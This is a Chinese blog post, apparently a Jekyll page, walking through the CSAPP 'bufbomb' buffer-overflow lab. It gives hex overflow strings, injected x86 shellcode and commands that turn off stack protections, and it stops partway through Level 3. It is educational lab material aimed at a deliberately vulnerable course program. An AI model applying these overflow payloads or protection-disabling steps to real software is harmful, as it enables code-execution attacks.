@@ -1,0 +1,914 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.3 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="zh" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>深入理解计算机系统之缓冲区溢出炸弹实验 - 峰子的乐园</title>
+<meta name="description" content="当心缓冲区溢出！">
+
+
+  <meta name="author" content="Bill Ding">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:site_name" content="峰子的乐园">
+<meta property="og:title" content="深入理解计算机系统之缓冲区溢出炸弹实验">
+<meta property="og:url" content="http://localhost:4000/csapp/2021/05/27/CSAPPLab03.html">
+
+
+  <meta property="og:description" content="当心缓冲区溢出！">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/img/teaser2.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-05-27T00:00:00+08:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/csapp/2021/05/27/CSAPPLab03.html">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Bill Ding",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="峰子的乐园 Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single categories">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          峰子的乐园
+          <span class="site-subtitle">合抱之木，生于毫末；九层之台，起于累土；千里之行，始于足下</span>
+        </a>
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/home/about">About</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/home/blog">Blogs</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories">Categories</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="https://google.com">External Link</a>
+            </li>
+</ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">切换菜单</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay" style=" background-image: url('/assets/img/teaser2.jpg');">
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          深入理解计算机系统之缓冲区溢出炸弹实验
+
+        
+      </h1>
+      
+        <p class="page__lead">当心缓冲区溢出！
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  3 minutes read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/img/avatar.jpg" alt="Bill Ding" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Bill Ding</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Programmer, Graduate majored in CS</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Hefei, Anhui, China</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="df12138@mail.ustc.edu.cn" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/dingfen" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="深入理解计算机系统之缓冲区溢出炸弹实验">
+    <meta itemprop="description" content="当心缓冲区溢出！">
+    <meta itemprop="datePublished" content="2021-05-27T00:00:00+08:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right sticky">
+            <nav class="toc">
+              <header><h4 class="nav__title">
+<i class="fas fa-file-alt"></i> 目录</h4></header>
+              <ul class="toc__menu">
+  <li>
+<a href="#%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%82%B8%E5%BC%B9%E5%AE%9E%E9%AA%8C">深入理解计算机系统之缓冲区溢出炸弹实验</a>
+    <ul>
+      <li><a href="#%E5%AE%9E%E9%AA%8C%E7%9B%AE%E6%A0%87">实验目标</a></li>
+      <li><a href="#%E5%AE%9E%E9%AA%8C%E6%9D%90%E6%96%99">实验材料</a></li>
+      <li><a href="#%E5%AE%9E%E9%AA%8C%E5%8E%9F%E7%90%86">实验原理</a></li>
+      <li>
+<a href="#%E5%AE%9E%E9%AA%8C%E5%BC%80%E5%A7%8B">实验开始</a>
+        <ul>
+          <li><a href="#level-0">Level 0</a></li>
+          <li><a href="#level-1">Level 1</a></li>
+          <li><a href="#level-2">Level 2</a></li>
+          <li><a href="#level-3">Level 3</a></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="深入理解计算机系统之缓冲区溢出炸弹实验">深入理解计算机系统之缓冲区溢出炸弹实验</h1>
+<h2 id="实验目标">实验目标</h2>
+
+<p>在实验过程中，进一步掌握函数调用时栈帧结构的变化。充分了解缓冲区溢出原理，并学会利用输入缓冲区的溢出漏洞，将攻击代码嵌入当前程序的栈帧中，使得程序执行我们所期望的过程。从实验中进一步感悟缓冲区溢出攻击方式，吸取经验教训，从而写出更安全的代码。</p>
+
+<h2 id="实验材料">实验材料</h2>
+
+<ul>
+  <li>
+<code class="language-plaintext highlighter-rouge">makecookie</code>：生成cookie</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">bufbomb</code>：可执行程序-攻击对象</li>
+  <li>
+<code class="language-plaintext highlighter-rouge">sendstring</code>:  字符格式转换</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">bufbomb</code> 程序是我们要攻击的对象，其缓冲区漏洞代码见下：</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">getbuf</span><span class="p">()</span> <span class="p">{</span> 
+	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span> 
+ 	<span class="n">Gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span> 
+ 	<span class="k">return</span> <span class="mi">1</span><span class="p">;</span> 
+<span class="p">}</span>
+</code></pre></div></div>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">getbuf:</span>
+	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>
+    <span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>
+    <span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x18</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
+    <span class="nf">lea</span>    <span class="o">-</span><span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>	<span class="c1">; only allocate 12 bytes</span>
+    <span class="nf">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+    <span class="nf">call</span>   <span class="mh">0x8048e60</span> <span class="o">&lt;</span><span class="nv">Gets</span><span class="o">&gt;</span>
+    <span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0x1</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
+    <span class="nf">leave</span>  
+    <span class="nf">ret</span>
+</code></pre></div></div>
+
+<p>代码中没有对 <code class="language-plaintext highlighter-rouge">buf</code> 数组进行越界检查（常见 C 编程错误），超过11个字符将溢出。而溢出的字符将覆盖栈帧上的数据和程序的返回地址。如果我们精心构造溢出的字符串，将程序“返回”至我们想要的代码上，就能控制程序流程。</p>
+
+<p>为了构造所需要的地址或其他数据，我们需要实现逆反“字符-&gt;ASCII码”的过程。出题人已经提供了 <code class="language-plaintext highlighter-rouge">sendstring</code> 工具，其使用方法为 <code class="language-plaintext highlighter-rouge">$ ./sendstring &lt; exploit.txt &gt; exploit-raw.txt</code>。其中 <code class="language-plaintext highlighter-rouge">exploit.txt</code> 保存目标数据（即空格分隔的ASCII码），<code class="language-plaintext highlighter-rouge">exploit-raw.txt</code> 为逆向出的字符串。</p>
+
+<p>攻击 <code class="language-plaintext highlighter-rouge">bufbomb</code> 程序时，先使用 <code class="language-plaintext highlighter-rouge">sendstring</code> 工具将输入的 ASCII 码转为输入给程序的字符串：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./sendstring &lt; exploit.txt <span class="o">&gt;</span> exploit-raw.txt
+</code></pre></div></div>
+
+<p>然后，再将学号（生成 cookie 需要）和该文件输入给攻击对象</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./bufbomb <span class="nt">-t</span> SA18xxxxxx &lt; exploit-raw.txt
+</code></pre></div></div>
+
+<h2 id="实验原理">实验原理</h2>
+
+<p>函数过程调用时的栈帧结构，见下图。</p>
+
+<p><img src="/assets/img/CSAPP/lab3/overflow.png" alt=""></p>
+
+<p>注意，这张图的地址增长方向是向上。在x86架构上，Caller函数要在调用新函数前，准备好函数参数：传递的参数少于7个，就可以通过寄存器传递，当参数过多寄存器不够用时，就需要通过栈来传递。当Caller调用函数时，会将返回地址压入栈中，形成Caller的栈帧末尾。而被调用函数的栈帧就从保存帧指针的值开始。</p>
+
+<h2 id="实验开始">实验开始</h2>
+
+<h3 id="level-0">Level 0</h3>
+
+<p>这一阶段要求，控制程序进入一个在正常情况下不会被调用的函数 <code class="language-plaintext highlighter-rouge">smoke()</code> 。首先看一下 <code class="language-plaintext highlighter-rouge">smoke()</code> 函数的内存位置，是 <code class="language-plaintext highlighter-rouge">0x08048e20</code> ：</p>
+
+<p><img src="/assets/img/CSAPP/lab3/1.png" alt=""></p>
+
+<p>下图显示了在调用 <code class="language-plaintext highlighter-rouge">Gets()</code> 函数前，<code class="language-plaintext highlighter-rouge">getbuf()</code>  的栈帧情况（代码见前文）。</p>
+
+<p><img src="/assets/img/CSAPP/lab3/7.png" alt=""></p>
+
+<p><code class="language-plaintext highlighter-rouge">Gets()</code> 函数接收 <code class="language-plaintext highlighter-rouge">buf</code> 的指针，因此这里是直接写入点，只要输入的字符超过 12 字节，就可以依次覆盖保存的 <code class="language-plaintext highlighter-rouge">%ebp</code> 的值和返回地址。我们将返回地址改为 <code class="language-plaintext highlighter-rouge">0x08048e20</code> 即可。注意，x86 是小端法。在 <code class="language-plaintext highlighter-rouge">exploit.txt</code> 中输入：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 20 8e 04 08
+</code></pre></div></div>
+
+<p>修改完成后，生成 <code class="language-plaintext highlighter-rouge">exploit-raw.txt</code> 文本，输入，得到结果见下：</p>
+
+<p><img src="/assets/img/CSAPP/lab3/3.png" alt=""></p>
+
+<h3 id="level-1">Level 1</h3>
+
+<p>现在实验要求程序跳转到 <code class="language-plaintext highlighter-rouge">fizz()</code> ，并且打印出 <code class="language-plaintext highlighter-rouge">fizz()</code> 函数的参数，必须为自己的 Cookie 值，我的 Cookie 值为 <code class="language-plaintext highlighter-rouge">0x46dd0bfe</code> 。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">fizz</span><span class="p">(</span><span class="kt">int</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span> 
+	<span class="n">entry_check</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> <span class="cm">/* Make sure entered this function properly */</span> 
+	<span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">)</span> <span class="p">{</span> 
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Fizz!: You called fizz(0x%x)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span> 
+		<span class="n">validate</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span> 
+	<span class="p">}</span> <span class="k">else</span> 
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Misfire: You called fizz(0x%x)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span> 
+	<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>还是一样，看一下 <code class="language-plaintext highlighter-rouge">fizz()</code> 函数的开始地址： <code class="language-plaintext highlighter-rouge">08048dc0</code> 。那么只需要把上面的答案的最后几位更改一下，程序就可以跳转到 <code class="language-plaintext highlighter-rouge">fizz()</code> 函数中了！</p>
+
+<p>但问题是，参数该怎么传入呢？先来看看 <code class="language-plaintext highlighter-rouge">fizz()</code> 怎么使用参数的：</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">fizz:</span>
+	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>
+	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>
+	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebx</span>
+	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x14</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
+	<span class="nf">mov</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">ebx</span> 	<span class="c1">; %ebx = (%ebp+0x8)</span>
+	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x1</span><span class="p">,(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+	<span class="nf">call</span>   <span class="mi">80489</span><span class="nv">a0</span> <span class="o">&lt;</span><span class="nv">entry_check</span><span class="o">&gt;</span>
+	<span class="nf">cmp</span>    <span class="mh">0x804a1cc</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span> <span class="c1">; compare with %ebx (0x804a1cc) maybe it is cookie</span>
+	<span class="nf">je</span>     <span class="mi">8048</span><span class="nv">e00</span> <span class="o">&lt;</span><span class="nv">fizz</span><span class="o">+</span><span class="mh">0x40</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>如果你熟悉 x86 汇编语言，很容易看出，<code class="language-plaintext highlighter-rouge">fizz()</code> 函数是从 <code class="language-plaintext highlighter-rouge">0x8(%ebp)</code> 取出。下图指出了程序运行的过程，<code class="language-plaintext highlighter-rouge">Getbuf()</code> 函数执行 <code class="language-plaintext highlighter-rouge">ret</code> 指令，将返回地址存到 <code class="language-plaintext highlighter-rouge">eip</code> 寄存器中，于是我们来到了 <code class="language-plaintext highlighter-rouge">fizz()</code> 函数，然后执行两个 <code class="language-plaintext highlighter-rouge">push</code> 命令，从图中可以清楚地看出参数的位置。</p>
+
+<p><img src="/assets/img/CSAPP/lab3/8.png" alt=""></p>
+
+<p>于是，在后面加上几位数字，就可以到达实验目的。见下图：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 c0 8d 04 08 01 02 03 04 fe 0b dd 46
+</code></pre></div></div>
+
+<p><img src="/assets/img/CSAPP/lab3/4.png" alt=""></p>
+
+<h3 id="level-2">Level 2</h3>
+
+<p>现在实验难度继续上升，要求程序跳转到 <code class="language-plaintext highlighter-rouge">bang()</code> 函数中，并且要求 <code class="language-plaintext highlighter-rouge">global_value==cookie</code> 这条分支。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">global_value</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> 
+<span class="kt">void</span> <span class="nf">bang</span><span class="p">(</span><span class="kt">int</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span> 
+	<span class="n">entry_check</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span> <span class="cm">/* Make sure entered this function properly */</span> 
+	<span class="k">if</span> <span class="p">(</span><span class="n">global_value</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">)</span> <span class="p">{</span> 
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Bang!: You set global_value to 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">global_value</span><span class="p">);</span> 
+		<span class="n">validate</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span> 
+	<span class="p">}</span> <span class="k">else</span> 
+		<span class="n">printf</span><span class="p">(</span><span class="s">"Misfire: global_value = 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">global_value</span><span class="p">);</span> 
+	<span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>这意味着我们需要在程序执行过程中，更改 <code class="language-plaintext highlighter-rouge">global_value</code> 的值。跳转到 <code class="language-plaintext highlighter-rouge">bang()</code> 函数难度不大，将返回地址修改一下就行。那么，如何修改 <code class="language-plaintext highlighter-rouge">global_value</code> 的值呢？有点难度，我们先从汇编代码入手，找到 <code class="language-plaintext highlighter-rouge">global_value</code> 的存放地址吧！</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">08048</span><span class="nf">d60</span> <span class="nv">bang</span><span class="p">:</span>
+	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>
+	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>
+	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x8</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
+	<span class="nf">movl</span>   <span class="kc">$</span><span class="mh">0x2</span><span class="p">,(</span><span class="o">%</span><span class="nb">esp</span><span class="p">)</span>
+	<span class="nf">call</span>   <span class="mi">80489</span><span class="nv">a0</span> <span class="o">&lt;</span><span class="nv">entry_check</span><span class="o">&gt;</span>
+	<span class="nf">mov</span>    <span class="mh">0x804a1dc</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>	<span class="c1">; global_value</span>
+	<span class="nf">cmp</span>    <span class="mh">0x804a1cc</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>	<span class="c1">; cookie</span>
+	<span class="nf">je</span>     <span class="mi">8048</span><span class="nv">da0</span> <span class="o">&lt;</span><span class="nv">bang</span><span class="o">+</span><span class="mh">0x40</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>从 GDB 调试器中，可以轻松地找到 <code class="language-plaintext highlighter-rouge">global_value</code> 的地址：</p>
+
+<p><img src="/assets/img/CSAPP/lab3/5.png" alt=""></p>
+
+<p>现在，要想办法把这个变量的值变为我们的 cookie 。当然，可以直接在 GDB 调试器里写入，不过这样实验就失去意义了！修改全局变量就需要注入我们自己的代码，然后将返回地址篡改到攻击代码处执行，最后再执行 <code class="language-plaintext highlighter-rouge">ret</code> 返回到 <code class="language-plaintext highlighter-rouge">bang()</code>。</p>
+
+<p>什么样的攻击代码才能满足我们的要求？不难，只需要修改 <code class="language-plaintext highlighter-rouge">global_value</code> 的值就行：</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x46dd0bfe</span><span class="p">,</span> <span class="mh">0x804a1dc</span>
+</code></pre></div></div>
+
+<p>然后，返回到 <code class="language-plaintext highlighter-rouge">bang()</code> 函数，装作无事发生：</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">push</span> <span class="kc">$</span><span class="mh">0x8048d60</span>
+<span class="nf">ret</span>
+</code></pre></div></div>
+
+<p>还有一个小问题，我们的攻击代码要放在哪里呢？我们只能掌控栈帧内存空间，虽然理论上说，这时我们已经可以指挥受害者干任何事情，但是这毕竟是一个实验，我不想把事情闹大，看起来也只有 <code class="language-plaintext highlighter-rouge">buf</code> 数组那边的空间比较合适。通过前两个实验的分析，<code class="language-plaintext highlighter-rouge">buf</code> 空间余留下16字节的空间，这应该够我们注入代码了！</p>
+
+<p>使用 gcc 和 objdump 把这三句话转化为二进制，然后数一数空间，诶嘿，正好16字节！</p>
+
+<p><img src="/assets/img/CSAPP/lab3/9.png" alt=""></p>
+
+<p>然后，把得到的二进制指令，放入到前16个字节中，而返回地址应该要填 <code class="language-plaintext highlighter-rouge">buf[0]</code> 的地址，使用 GDB 调试器，可以知道 <code class="language-plaintext highlighter-rouge">ebp</code> 寄存器的值是 <code class="language-plaintext highlighter-rouge">0xffffb878</code> ，那么 <code class="language-plaintext highlighter-rouge">buf[0]</code> 的地址就是 <code class="language-plaintext highlighter-rouge">0xffffb878-0xc=0xffffb86c</code>，于是写入：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c7 05 dc a1 04 08 fe 0b dd 46 68 60 8d 04 08 c3 6c b8 ff ff
+</code></pre></div></div>
+
+<p>但是，如果你亲自实践的话，会发现这样仍然有错，程序不会跳转到你想要它去的地方，而是会发出 Segmentation Fault 这个令人烦恼的错误 <img class="emoji" title=":angry:" alt=":angry:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f620.png" height="20" width="20">。这是因为，Linux 为了防止缓冲区溢出攻击，已经将栈帧空间的代码可执行权限关闭了，如果将攻击代码放在栈帧区，也会因没有执行权限而无法运行。</p>
+
+<p>解决方法：安装execstack：<code class="language-plaintext highlighter-rouge">sudo apt-get install execstack</code>。然后，修改程序堆栈的可执行属性：<code class="language-plaintext highlighter-rouge">execstack -s bufbomb</code> 。如果拥有 <code class="language-plaintext highlighter-rouge">bufbomb</code> 的源代码，也可以在编译时关闭保护机制重新编译：</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc <span class="nt">-g</span> <span class="nt">-z</span> execstack <span class="nt">-fno-stack-protector</span> bufbomb.c <span class="nt">-o</span> bufbomb
+</code></pre></div></div>
+
+<p>另外，修改堆栈可执行属性只能在gdb调试下有效，实际运行仍然会出现段错误。所以，彻底解决的方法还是找到源代码以后重新编译。还要注意一点，多次实验时可能会出现缓冲区首地址改变的情况。经过短暂地调整后，实验成功！</p>
+
+<p><img src="/assets/img/CSAPP/lab3/6.png" alt=""></p>
+
+<h3 id="level-3">Level 3</h3>
+
+<p>最后一关，正常程序中 <code class="language-plaintext highlighter-rouge">test()</code> 返回后执行第 15 行代码，而我们要让函数执行第 12 行。</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">test</span><span class="p">()</span> <span class="p">{</span> 
+	<span class="kt">int</span> <span class="n">val</span><span class="p">;</span> 
+    <span class="k">volatile</span> <span class="kt">int</span> <span class="n">local</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span> 
+    <span class="n">entry_check</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span> <span class="cm">/* Make sure entered this function properly */</span> 
+    <span class="n">val</span> <span class="o">=</span> <span class="n">getbuf</span><span class="p">();</span> 
+	<span class="cm">/* Check for corrupted stack */</span> 
+	<span class="k">if</span> <span class="p">(</span><span class="n">local</span> <span class="o">!=</span> <span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="p">{</span> 
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Sabotaged!: the stack has been corrupted</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span> 
+	<span class="p">}</span> 
+	<span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">val</span> <span class="o">==</span> <span class="n">cookie</span><span class="p">)</span> <span class="p">{</span> 
+        <span class="n">printf</span><span class="p">(</span><span class="s">"Boom!: getbuf returned 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span> 	<span class="c1">// 12 行</span>
+        <span class="n">validate</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span> 
+    <span class="p">}</span> 
+   <span class="k">else</span> <span class="p">{</span> <span class="c1">// 15 行</span>
+ 		<span class="n">printf</span><span class="p">(</span><span class="s">"Dud: getbuf returned 0x%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span> 
+ 	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>这意味着我需要在 <code class="language-plaintext highlighter-rouge">getbuf()</code> 结束后回到 <code class="language-plaintext highlighter-rouge">test()</code> 原本的位置，并将 cookie 作为 <code class="language-plaintext highlighter-rouge">getbuf()</code> 的返回值传给 <code class="language-plaintext highlighter-rouge">test()</code> 。为了做到这一点，在攻击过程中，需要将 <code class="language-plaintext highlighter-rouge">%ebp</code> 的值恢复，使程序不会因为外部攻击而出错崩溃。可以使用GDB 调试器找到调用<code class="language-plaintext highlighter-rouge">getbuf</code> 函数之后，<code class="language-plaintext highlighter-rouge">%ebp</code> 的值：<code class="language-plaintext highlighter-rouge">0xffffb898</code>。</p>
+
+<p>我打算故技重施，直接插入攻击代码，先修改返回值为我的 cookie，再将正常返回地址压入栈，最后保持存放 <code class="language-plaintext highlighter-rouge">ebp</code> 值不变。攻击代码我已写好：</p>
+
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">movl</span> <span class="kc">$</span><span class="mh">0x46dd0bfe</span><span class="p">,</span> <span class="o">%</span><span class="nb">eax</span>
+<span class="nf">push</span> <span class="kc">$</span><span class="mh">0x0804901e</span>
+<span class="nf">ret</span>
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">0x0804901e</code> 值就是正常的返回地址，<code class="language-plaintext highlighter-rouge">call</code> 语句的下一条指令地址。</p>
+
+<p><img src="/assets/img/CSAPP/lab3/10.png" alt=""></p>
+
